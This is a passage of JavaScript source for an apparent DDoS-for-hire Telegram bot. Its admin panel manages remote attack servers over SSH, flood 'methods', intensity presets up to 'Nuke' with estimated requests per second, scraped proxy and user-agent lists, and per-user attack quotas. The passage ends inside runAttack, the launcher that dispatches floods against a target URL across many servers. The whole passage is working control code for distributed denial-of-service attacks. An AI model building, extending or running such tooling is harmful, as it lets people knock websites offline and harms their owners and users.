  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showTop(chatId, editMsgId, userId) {
  const users = Object.values(store.users.get());
  const top = users
    .map(u => ({ id: u.telegramId, name: u.firstName || u.username || String(u.telegramId), count: u.attackCount || 0 }))
    .filter(u => u.count > 0)
    .sort((a, b) => b.count - a.count)
    .slice(0, 10);
  const txt = [`📈 <b>Top Attackers</b>`, ''];
  if (!top.length) txt.push('📭 No data yet');
  else {
    top.forEach((u, i) => {
      const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `${i + 1}.`;
      txt.push(`${medal} ${esc(u.name)} — <b>${u.count}</b> attacks`);
    });
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showIntensities(chatId, editMsgId, userId) {
  const admin = isAdmin(userId);
  const total = store.servers.get().filter(s => s.status === 'online').length;
  const available = Object.entries(INTENSITY).filter(([, v]) => !v.adminOnly || admin);
  const txt = [`💥 <b>Intensity Presets</b>`, ``, `<i>Extreme/Nuke require 16+ core servers</i>`, ``];
  for (const [k, v] of available) {
    const eligible = getEligibleServers(k).length;
    const est = estimateRpsFor(k);
    const coreTag = v.minCores ? ` · min ${v.minCores} cores` : '';
    txt.push(`${v.emoji} <b>${v.label}</b>${v.adminOnly ? ' 🔒' : ''}${coreTag}`);
    if (k === 'auto') txt.push(`  per-server · ${eligible}/${total} eligible · ~${formatNum(est?.aggregateRps || 0)} RPS aggregate`);
    else txt.push(`  ${v.threads}T × ${v.rate}R · ${v.minCores ? `${eligible}/${total}` : total} nodes · ~${formatNum(est?.aggregateRps || 0)} RPS`);
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showEligible(chatId, editMsgId) {
  const total = store.servers.get().filter(s => s.status === 'online').length;
  const txt = [`🔥 <b>Eligible Servers by Intensity</b>`, ``, `<i>Total online: ${total}</i>`, ''];
  for (const [k, v] of Object.entries(INTENSITY)) {
    if (v.adminOnly) continue;
    const eligible = getEligibleServers(k);
    txt.push(`${v.emoji} <b>${v.label}</b>${v.minCores ? ` (min ${v.minCores}c)` : ''}: <b>${eligible.length}/${total}</b>`);
    if (v.minCores) {
      for (const s of store.servers.get().filter(s => s.status === 'online')) {
        const cores = getServerCores(s.id);
        if (cores && cores >= v.minCores) txt.push(`  ✅ ${esc(s.name)} · ${cores}c`);
      }
    }
    txt.push('');
  }
  txt.push(`<i>Servers with unknown cores are skipped.</i>`);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu('⬅️ Back', 'menu_admin') });
}

async function showScanDeps(chatId, editMsgId) {
  const txt = [`🔬 <b>Method Scan</b>`, ``];
  const allDeps = new Set(), allAux = new Set();
  for (const m of allMethods()) {
    const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    if (!fileExists) { txt.push(`❌ <b>${m.emoji || ''} ${m.name}</b> <code>${m.file}</code>`); txt.push(`  <i>file missing</i>`); continue; }
    const deps = scanMethodDeps(m.file);
    const aux = scanMethodAux(m.file);
    deps.forEach(d => allDeps.add(d)); aux.forEach(a => allAux.add(a));
    const icons = [];
    if (deps.length) icons.push('📦');
    if (aux.length) icons.push('📎');
    if (!icons.length) icons.push('✅');
    txt.push(`${icons.join('')} <b>${m.emoji || ''} ${m.name}</b> <code>${m.file}</code>${m.parseIntensity ? ' ⚙️' : ''}`);
    if (deps.length) txt.push(`  📦 npm: ${deps.map(d => `<code>${esc(depDisplay(d))}</code>`).join(' · ')}`);
    if (aux.length) txt.push(`  📎 aux: ${aux.map(a => `<code>${esc(a)}</code>`).join(' · ')}`);
    if (!deps.length && !aux.length) txt.push(`  <i>no external deps</i>`);
  }
  txt.push('', `<b>━━━ npm (${allDeps.size}) ━━━</b>`);
  for (const d of [...allDeps].sort()) {
    const pinned = PINNED_VERSIONS[d];
    txt.push(pinned && pinned !== d ? `• <code>${d}</code> → <code>${pinned}</code>` : `• <code>${d}</code>`);
  }
  txt.push('', `<b>━━━ aux (${allAux.size}) ━━━</b>`);
  for (const a of [...allAux].sort()) {
    const exists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, a));
    const size = exists ? fs.statSync(path.join(CONFIG.SCRIPT_DIR, a)).size : 0;
    txt.push(`${exists ? '✅' : '❌'} <code>${esc(a)}</code>${exists ? ` · ${formatBytes(size)}` : ' · <i>missing</i>'}`);
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu('⬅️ Back', 'menu_admin') });
}

/* ══════════════════════════════════════════════════════════════════════════
   ADMIN VIEWS
   ══════════════════════════════════════════════════════════════════════════ */

async function showAdminPanel(chatId, editMsgId, viewerId) {
  const users = Object.values(store.users.get());
  const s = serverStats();
  const running = Object.values(store.sessions.get()).filter(x => x.status === 'running').length;
  const batches = new Set(Object.values(store.sessions.get()).filter(x => x.status === 'running').map(x => x.batchId)).size;
  const mem = process.memoryUsage();
  const owners = CONFIG.ADMIN_IDS.length;
  const admins = users.filter(u => u.role === 'admin' && !isOwner(u.telegramId)).length;
  const viewer = getUser(viewerId);
  const online = botIsOnline();
  const uaCount = readUAs().length;
  const proxyCount = readProxies().length;
  const q = attackQueue.stats();
  const txt = [
    `${isOwner(viewerId) ? '👑' : '🛡'} <b>${BRAND} Admin</b> <i>${VERSION}</i>`,
    `<i>Viewing as ${roleLabel(viewer || { telegramId: viewerId })}</i>`, ``,
    `🏛 Status: ${online ? '🟢 ONLINE' : '🔴 MAINTENANCE'}`,
    `👥 Users: <b>${users.length}</b> (${owners}👑 · ${admins}🛡 · ${users.filter(u => u.role === 'pending').length}⏳)`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online`,
    `📦 Methods: <b>${allMethods().filter(m => m.enabled).length}/${allMethods().length}</b>`,
    `🌐 Proxies: <b>${formatNum(proxyCount)}</b> · 🎭 UAs: <b>${formatNum(uaCount)}</b>`,
    `⚔️ Active: <b>${batches}</b> batch(es) · <b>${running}</b> session(s)`,
    `🎯 Queue: <b>${q.pending}</b> pending · <b>${q.running}</b> running`,
    `🧠 Heap: ${(mem.heapUsed / 1048576).toFixed(1)}MB`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: adminMenu(viewerId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: adminMenu(viewerId) });
}

async function showBotControl(chatId, editMsgId) {
  const st = store.botstate.get();
  const online = st.online !== false;
  const txt = [`🤖 <b>Bot Control</b>`, ``, `Status: ${online ? '🟢 <b>ONLINE</b>' : '🔴 <b>MAINTENANCE MODE</b>'}`, ``, `<b>Maintenance message:</b>`, `<i>${esc(st.maintenanceMsg || '(default)')}</i>`].join('\n');
  const kb = [
    [online ? btn('🔴 Turn OFF', 'botctl_off', 'danger') : btn('🟢 Turn ON', 'botctl_on', 'success')],
    [btn('✏️ Edit Message', 'botctl_msg', 'primary')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminUsers(chatId, editMsgId, page = 1) {
  const all = Object.values(store.users.get());
  const { slice, page: p, total, hasNext, hasPrev } = paginate(all, page, 8);
  const kb = slice.map(u => {
    const icon = roleBadge(u);
    const style = isOwner(u.telegramId) ? 'danger' : (u.role === 'admin' ? 'success' : (u.role === 'user' ? 'success' : 'primary'));
    return [btn(`${icon} ${u.firstName || u.username || u.telegramId}`, `usr_${u.telegramId}`, style)];
  });
  const nav = [];
  if (hasPrev) nav.push(btn('« Prev', `adm_users_p${p - 1}`, 'primary'));
  nav.push(btn(`${p}/${total || 1}`, 'noop', 'primary'));
  if (hasNext) nav.push(btn('Next »', `adm_users_p${p + 1}`, 'primary'));
  if (nav.length) kb.push(nav);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `👥 <b>Users (${all.length})</b>\n\n👑 owner · 🛡 admin · ✅ user · ⏳ pending · 🚫 banned`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

function userAccessBadge(u) {
  if (isAdmin(u.telegramId)) return 'all';
  const am = u.allowedMethods;
  if (am === null || am === undefined) return 'all';
  if (Array.isArray(am) && am.length === 0) return '🔒 none';
  return `${am.length} method(s)`;
}

async function showUserActions(chatId, editMsgId, targetId, viewerId) {
  const u = getUser(targetId);
  if (!u) return;
  const l = u.limits || {};
  const viewerIsOwner = isOwner(viewerId);
  const targetIsOwner = isOwner(Number(targetId));
  const targetIsAdmin = u.role === 'admin';
  const viewerIsTarget = String(viewerId) === String(targetId);

  const kb = [];
  if (!targetIsOwner) kb.push([btn('✅ Approve', `approve_${targetId}`, 'success'), btn('🚫 Ban', `ban_${targetId}`, 'danger')]);
  else kb.push([btn('👑 Owner — protected', 'noop', 'danger')]);

  if (viewerIsOwner && !targetIsOwner && !viewerIsTarget) {
    if (targetIsAdmin) kb.push([btn('⬇️ Revoke Admin', `revokadm_${targetId}`, 'danger')]);
    else if (u.role !== 'banned') kb.push([btn('⬆️ Make Admin', `makeadm_${targetId}`, 'success')]);
  }
  kb.push([btn(`🔓 Access (${userAccessBadge(u)})`, `uaccess_${targetId}`, 'primary')]);
  kb.push([
    btn(`⏱ Dur (${l.maxDuration || '∞'})`, `setdur_${targetId}`, 'primary'),
    btn(`⚔️ Attacks (${l.maxConcurrent || '∞'})`, `setconc_${targetId}`, 'primary'),
  ]);
  kb.push([btn(`🖥 Servers/attack (${l.maxServers || '∞'})`, `setmaxsrv_${targetId}`, 'primary')]);
  if (!targetIsOwner && !viewerIsTarget) kb.push([btn('❌ Delete', `del_${targetId}`, 'danger')]);
  kb.push([btn('⬅️ Back', 'adm_users', 'primary')]);

  const txt = [
    `${roleBadge(u)} <b>${esc(u.firstName || u.username || targetId)}</b>`,
    `ID: <code>${targetId}</code> · Role: <b>${roleLabel(u)}</b>`, ``,
    `⏱ Duration: ${l.maxDuration || '∞'}s`,
    `⚔️ Concurrent attacks: ${l.maxConcurrent || '∞'}`,
    `🖥 Servers/attack: ${l.maxServers || '∞'}`,
    `📊 Threads: ${l.maxThreads || '∞'} · Rate: ${l.maxRate || '∞'}`,
    `⏳ Cooldown: ${l.cooldown || 0}s`, ``,
    `Access: <b>${userAccessBadge(u)}</b>`,
    `Total attacks: <b>${u.attackCount || 0}</b>`,
    `Active batches: ${userActiveBatches(Number(targetId))} · Sessions: ${userActiveCount(Number(targetId))}`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showUserAccess(chatId, editMsgId, targetId) {
  const u = getUser(targetId);
  if (!u) return;
  const methods = allMethods();
  const am = u.allowedMethods;
  const allAllowed = (am === null || am === undefined);
  const kb = methods.map(m => {
    const allowed = allAllowed || (Array.isArray(am) && am.includes(m.id));
    const stateIcon = m.enabled ? '' : ' 🔴';
    return [btn(`${allowed ? '✅' : '❌'} ${m.emoji || '📦'} ${m.name}${stateIcon}`, `uat_${targetId}_${m.id}`, allowed ? 'success' : 'danger')];
  });
  kb.push([btn('🟢 All', `uaccessall_${targetId}`, 'success'), btn('🔒 None', `uaccessnone_${targetId}`, 'danger')]);
  kb.push([btn('⬅️ Back', `usr_${targetId}`, 'primary')]);
  const txt = [`🔓 <b>Method Access</b>`, `👤 ${esc(u.firstName || u.username || targetId)}`, ``, allAllowed ? '<i>Current: ALL enabled methods</i>' : `<i>Current: ${Array.isArray(am) ? am.length : 0} allowed</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminServers(chatId, editMsgId) {
  const list = store.servers.get();
  const busy = busyServerIds();
  const kb = list.map(s => {
    const env = remoteEnvCache.get(s.id) || healthCache.get(s.id)?.env;
    const hw = env ? ` · ${hardwareBadge(env)}${hardwareIcon(env)}` : '';
    const busyTag = busy.has(s.id) ? ' ⚔️' : '';
    return [btn(`🖥 ${s.name}${s.group ? ` [${s.group}]` : ''}${hw}${busyTag}`, `srv_${s.id}`, s.status === 'online' ? 'success' : 'danger')];
  });
  kb.push([btn('➕ Add Server', 'addsrv_start', 'primary')]);
  kb.push([btn('🔄 Sync All', 'syncall_methods', 'success'), btn('⚡ Provision All', 'provision_all', 'success')]);
  kb.push([btn('📦 Install Deps All', 'deps_all', 'success'), btn('🗑 Delete Offline', 'del_offline', 'danger')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `🖥 <b>Servers (${list.length})</b>\n\n<i>🔥=16+ · 🔥🔥=24+ · ⚡=8+ · ⚔️=busy</i>`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showServerActions(chatId, editMsgId, serverId) {
  const s = getServer(serverId);
  if (!s) return;
  const n = serverLoad(serverId);
  const env = remoteEnvCache.get(serverId) || healthCache.get(serverId)?.env;
  const deps = remoteDepsCache.get(serverId);

  const hwLines = [];
  if (env) {
    if (env.cores) hwLines.push(`Cores: <b>${env.cores}</b>${hardwareIcon(env)}`);
    if (env.memMB) hwLines.push(`RAM: <b>${formatGB(env.memMB)}</b>`);
    if (env.diskGB) hwLines.push(`Disk: <b>${env.diskGB}G</b>`);
    if (env.arch) hwLines.push(`Arch: <code>${esc(env.arch)}</code>`);
    if (env.nodePath) hwLines.push(`Node: <code>${esc(env.nodePath)}</code> v${esc(env.version || '?')}`);
    if (env.cores) hwLines.push(`Est. max RPS: <b>~${formatNum(estimateNodeRps(env.cores))}</b>`);
  }
  hwLines.push(`Deps: ${deps ? (deps.ok ? '✅ match' : '❌ ' + (deps.missing || '?')) : '⚪'}`);
  const eligible = INTENSITY.extreme.minCores <= (env?.cores || 0);
  hwLines.push(`Extreme/Nuke: ${eligible ? '✅ eligible' : '❌ too few cores'}`);

  const kb = [
    [btn('🔄 Sync Scripts', `srv_sync_${serverId}`, 'primary'), btn('🔍 Health', `srv_health_${serverId}`, 'primary')],
    [btn('🧪 Test SSH', `srv_test_${serverId}`, 'primary'), btn('🧪 Diag', `srv_diag_${serverId}`, 'primary')],
    [btn('⚡ Provision', `srv_provision_${serverId}`, 'success'), btn('📦 Install Deps', `srv_deps_${serverId}`, 'success')],
    [btn(`🔌 Port (${s.port || 22})`, `srv_edit_port_${serverId}`, 'primary'), btn(`🏷 Tag (${s.group || '—'})`, `srv_group_${serverId}`, 'primary')],
    [btn('❌ Delete', `srv_del_${serverId}`, 'danger')],
    [btn('⬅️ Back', 'adm_servers', 'primary')],
  ];
  const txt = [
    `🖥 <b>${esc(s.name)}</b>`,
    `Host: <code>${s.host}:${s.port || 22}</code>`,
    `Status: <b>${s.status}</b> · User: ${esc(s.username)}`,
    ...hwLines,
    `Tag: ${s.group ? `<code>${esc(s.group)}</code>` : '—'}`,
    `Active sessions: ${n}`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethods(chatId, editMsgId) {
  const list = allMethods();
  const kb = list.map(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const icon = m.enabled ? (ok ? '🟢' : '❌') : '🔴';
    return [btn(`${icon} ${m.emoji || ''} ${m.name}${m.builtin ? '' : ' 🔧'}${m.parseIntensity ? ' ⚙️' : ''}`, `methodview_${m.id}`, m.enabled ? 'success' : 'danger')];
  });
  kb.push([btn('➕ Add Method', 'addmethod_start', 'success')]);
  kb.push([btn('🟢 Enable All', 'methods_enable_all', 'success'), btn('🔴 Disable All', 'methods_disable_all', 'danger')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const enabledCount = list.filter(m => m.enabled).length;
  const txt = `📦 <b>Methods (${list.length})</b>\n\n🟢 ${enabledCount} enabled · 🔴 ${list.length - enabledCount} disabled\n⚙️ = per-method intensity (conn×streams)`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethodDetail(chatId, editMsgId, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
  const st = getMethodState(methodId);
  const deps = scanMethodDeps(m.file);
  const aux = scanMethodAux(m.file);
  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b> ${m.enabled ? '🟢' : '🔴'}`,
    `ID: <code>${m.id}</code> · File: <code>${m.file}</code> ${fileExists ? '✅' : '❌'}`,
    `Type: <b>${m.builtin ? 'built-in' : 'custom'}</b>${m.parseIntensity ? ' · ⚙️ per-method intensity' : ''}`, ``,
    `📝 <i>${esc(m.desc)}</i>`,
    `📦 Deps: ${deps.length ? deps.map(d => `<code>${esc(depDisplay(d))}</code>`).join(', ') : '<i>none</i>'}`,
    `📎 Aux: ${aux.length ? aux.map(a => `<code>${esc(a)}</code>`).join(', ') : '<i>none</i>'}`,
    `⏳ Min Cooldown: ${st.minCooldown || 0}s`, ``,
    `<b>Example:</b>`, `<code>${esc(m.example)}</code>`,
  ];
  if (m.parseIntensity) {
    txt.push('', '<b>Intensity mapping:</b>');
    for (const lvl of ['light', 'swarm', 'medium', 'heavy', 'extreme', 'nuke']) {
      const int = m.parseIntensity(lvl, 4);
      txt.push(`  ${INTENSITY[lvl]?.emoji || ''} ${lvl}: ${int.conn}c × ${int.streams}s`);
    }
  }
  if (st.stats?.launches) txt.push('', `📈 Launches: <b>${st.stats.launches}</b>`);
  const kb = [
    [btn(m.enabled ? '🔴 Disable' : '🟢 Enable', `mtoggle_${methodId}`, m.enabled ? 'danger' : 'success')],
    [btn(`⏳ Cooldown (${st.minCooldown || 0}s)`, `mcooldown_${methodId}`, 'primary')],
  ];
  if (!m.builtin) {
    kb.push([btn('🧪 Test Parse', `method_test_${methodId}`, 'primary')]);
    kb.push([btn('🔄 Re-sync', `method_resync_${methodId}`, 'primary')]);
    kb.push([btn('🗑 Delete', `method_delete_${methodId}`, 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'adm_methods', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminProxies(chatId, editMsgId) {
  const p = readProxies();
  const preview = p.slice(0, 3);
  const kb = [
    [btn('📁 Upload .txt', 'proxy_upload', 'success'), btn('🔄 Scrape GitHub', 'proxy_scrape', 'primary')],
    [btn('🧪 Health Check', 'proxy_health', 'primary'), btn('📤 Sync All', 'proxy_syncall', 'primary')],
    [btn('🗑 Clear', 'proxy_clear', 'danger')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  const txt = [`🌐 <b>Proxies</b>`, ``, `Total: <b>${formatNum(p.length)}</b>`, ``, preview.length ? `<b>Preview:</b>\n<code>${preview.map(esc).join('\n')}</code>` : '<i>empty</i>', ``, `<i>Health check tests 50 random.</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminUA(chatId, editMsgId) {
  const uas = readUAs();
  const preview = uas.slice(0, 3);
  const kb = [
    [btn('📁 Upload .txt', 'ua_upload', 'success'), btn('🔄 Scrape GitHub', 'ua_scrape', 'primary')],
    [btn('🧪 Validate + Dedupe', 'ua_validate', 'primary'), btn('📤 Sync All', 'ua_syncall', 'primary')],
    [btn('🗑 Clear', 'ua_clear', 'danger')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  const txt = [`🎭 <b>User-Agents</b>`, ``, `Total: <b>${formatNum(uas.length)}</b>`, ``, preview.length ? `<b>Preview:</b>\n${preview.map(u => `<code>${esc(u.slice(0, 80))}${u.length > 80 ? '…' : ''}</code>`).join('\n')}` : '<i>empty</i>', ``, `<i>Upload a .txt with one UA per line, or scrape from GitHub.</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminAux(chatId, editMsgId) {
  const uaCount = readUAs().length;
  const proxyCount = readProxies().length;
  const txt = [`📎 <b>Aux Files</b>`, ``, `<b>proxy.txt</b> · ${formatNum(proxyCount)} line(s)`, `<b>ua.txt</b> · ${formatNum(uaCount)} line(s)`, ``, `<i>Auto-synced to all servers before every attack.</i>`].join('\n');
  const kb = [
    [btn('🌐 Manage Proxies', 'adm_proxies', 'primary'), btn('🎭 Manage UAs', 'adm_ua', 'primary')],
    [btn('📤 Sync All Aux', 'aux_syncall', 'success')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminPresets(chatId, editMsgId) {
  const presets = store.presets.get();
  const list = Object.entries(presets);
  const kb = list.map(([name, p]) => [btn(`🎯 @${name} → ${p.method}`, `preset_${name}`, 'primary')]);
  kb.push([btn('➕ Add Preset', 'preset_add', 'success')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = [`🎯 <b>Presets (${list.length})</b>`, '', '<i>Usage: /attack @name &lt;url&gt; &lt;dur&gt;</i>'].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showPresetDetail(chatId, editMsgId, name) {
  const p = store.presets.get()[name];
  if (!p) return;
  const txt = [`🎯 <b>@${esc(name)}</b>`, ``, `Method: <b>${esc(p.method)}</b>`, `Threads: ${p.threads} · Rate: ${p.rate}`, ``, `<b>Usage:</b>`, `<code>/attack @${name} https://example.com 60</code>`].join('\n');
  const kb = [[btn('🗑 Delete', `preset_del_${name}`, 'danger')], [btn('⬅️ Back', 'adm_presets', 'primary')]];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showManageAdmins(chatId, editMsgId) {
  const owners = CONFIG.ADMIN_IDS.map(id => getUser(id) || { telegramId: id, firstName: `Owner#${id}` });
  const promoted = Object.values(store.users.get()).filter(u => u.role === 'admin' && !isOwner(u.telegramId));
  const txt = [
    `👑 <b>Manage Admins</b>`, ``,
    `<b>Owners (${owners.length})</b>:`,
    ...owners.map(o => `• <code>${o.telegramId}</code> ${esc(o.firstName || o.username || '?')}`),
    ``, `<b>Promoted (${promoted.length})</b>:`,
    ...promoted.slice(0, 15).map(p => `• <code>${p.telegramId}</code> ${esc(p.firstName || p.username || '?')}`),
  ].filter(Boolean).join('\n');
  const kb = [[btn('👥 Open Users List', 'adm_users', 'primary')], [btn('⬅️ Back', 'menu_admin', 'primary')]];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAudit(chatId, editMsgId) {
  const lines = tailAudit(20);
  const txt = [`📜 <b>Audit (last 20)</b>`, '', '```'];
  for (const l of lines) {
    try { const o = JSON.parse(l); txt.push(`${o.at.slice(11, 19)} ${o.event} ${o.actor}`); }
    catch { txt.push(l.slice(0, 60)); }
  }
  txt.push('```');
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu('⬅️ Back', 'menu_admin') });
}

/* ══════════════════════════════════════════════════════════════════════════
   ATTACK LAUNCHER
   ══════════════════════════════════════════════════════════════════════════ */

async function runAttack(user, method, parsed, chatId, opts = {}) {
  const level = opts.intensity || 'custom';
  const preset = INTENSITY[level];

  const allOnline = store.servers.get().filter(s => s.status === 'online');
  if (allOnline.length === 0) {
    return bot.sendMessage(chatId, '❌ <b>No online servers</b>\n\n<i>All attacks are executed on remote servers only. Add at least one server first.</i>', { parse_mode: 'HTML' });
  }

  const alloc = allocateServersForAttack(user, level, opts.group);
  if (alloc.error === 'no_eligible') {
    const msg = (level === 'extreme' || level === 'nuke')
      ? `❌ <b>No servers with ${preset?.minCores}+ cores</b>\n\n<i>All attacks are remote-only. Extreme/Nuke require 16+ core servers.</i>`
      : '❌ <b>No eligible servers</b>';
    return bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
  }
  if (alloc.error === 'all_busy') {
    return bot.sendMessage(chatId, `⚠️ <b>All servers are busy</b>\n\n<i>All ${alloc.total} eligible server(s) are currently attacking for other users.</i>`, { parse_mode: 'HTML' });
  }

  const servers = alloc.servers;
  if (!servers.length) return bot.sendMessage(chatId, '❌ No servers allocated', { parse_mode: 'HTML' });

  const totalTargets = servers.length;
  const batchId = newBatchId();

  upsertUser(user.telegramId, { lastMethod: method.id, lastTarget: parsed.target });
  bumpMethodStats(method.id, user.telegramId);
  store.users.mutate(u => { const k = String(user.telegramId); if (u[k]) u[k].attackCount = (u[k].attackCount || 0) + 1; });

  const intensityLabel = preset?.label;
  const intensityTag = intensityLabel ? ` · ${intensityLabel}` : '';
  const groupLabel = opts.group ? ` [${opts.group}]` : '';
  const isAuto = level === 'auto';
  const perServerParsed = new Map();
  let totalEstRps = 0;

  if (isAuto) {
    for (const srv of servers) {
      const cores = getServerCores(srv.id) || 4;
      let threads, rate;
      if (method.parseIntensity) { const int = method.parseIntensity('auto', cores); threads = int.conn; rate = int.streams; }
      else { const calc = preset.calculate(cores); threads = calc.threads; rate = calc.rate; }
      const p = method.parse([parsed.target, String(parsed.duration), String(threads), String(rate)]);
      perServerParsed.set(srv.id, p);
      totalEstRps += threads * rate;
    }
  } else {
    for (const srv of servers) perServerParsed.set(srv.id, parsed);
    totalEstRps = (preset?.threads || parsed.threads) * (preset?.rate || parsed.rate) * servers.length;
  }

  const limitNote = alloc.requestedLimit > 0
    ? `<i>Server limit: ${servers.length}/${alloc.requestedLimit} (from ${alloc.availableFree} free / ${alloc.totalPool} total)</i>`
    : `<i>Using ${servers.length}/${alloc.totalPool} servers (unlimited)</i>`;

  const serverList = servers.slice(0, 6).map(s => `• ${esc(s.name)}`).join('\n');
  const moreSrv = servers.length > 6 ? `\n• … +${servers.length - 6} more` : '';

  const progress = await bot.sendMessage(chatId,
    `${method.emoji || '💥'} <b>Launching ${esc(method.name)}${intensityTag}${esc(groupLabel)}</b>\n` +
    `🎯 <code>${esc(parsed.target)}</code>\n` +
    `⏱ ${parsed.duration}s\n` +
    `📊 Est. aggregate: ~${formatNum(totalEstRps)}\n\n` +
    `🖥 <b>Allocated ${servers.length} server(s):</b>\n${serverList}${moreSrv}\n\n` +
    `${limitNote}\n` +
    `⚡ Dispatching…`,
    { parse_mode: 'HTML', disable_web_page_preview: true });

  await prewarmServers(servers.map(s => s.id));

  const results = [];
  const remotePromises = servers.map(s => new Promise(resolve => {
    attackQueue.push({
      kind: 'remote', serverId: s.id,
      fn: async () => {
        try {
          const sp = perServerParsed.get(s.id) || parsed;
          await launchRemote(user, method, sp, s.id, batchId, (msg) => {
            bot.sendMessage(chatId, `⚡ ${esc(s.name)}: ${esc(msg)}`).catch(() => {});
          });
          results.push({ ok: true, where: s.name }); resolve(true);
        } catch (e) {
          results.push({ ok: false, error: `${s.name}: ${e.message}` }); resolve(false);
        }
      },
      onError: e => { results.push({ ok: false, error: e.message }); resolve(false); },
    });
  }));

  await Promise.all(remotePromises);
  const okCount = results.filter(r => r.ok).length;

  store.history.mutate(h => {
    h.push({
      at: Date.now(), method: method.id, target: parsed.target,
      duration: parsed.duration, ok: okCount, total: totalTargets,
      by: user.telegramId, intensity: level, estRps: totalEstRps,
      servers: servers.map(s => s.id),
    });
    if (h.length > 500) h.splice(0, h.length - 500);
  });

  if (user.limits?.cooldown > 0) setCooldown(user.telegramId, user.limits.cooldown);
  const mcd = getMethodCooldown(method.id);
  if (mcd > 0) {
    const cur = store.cooldowns.get()[String(user.telegramId)];
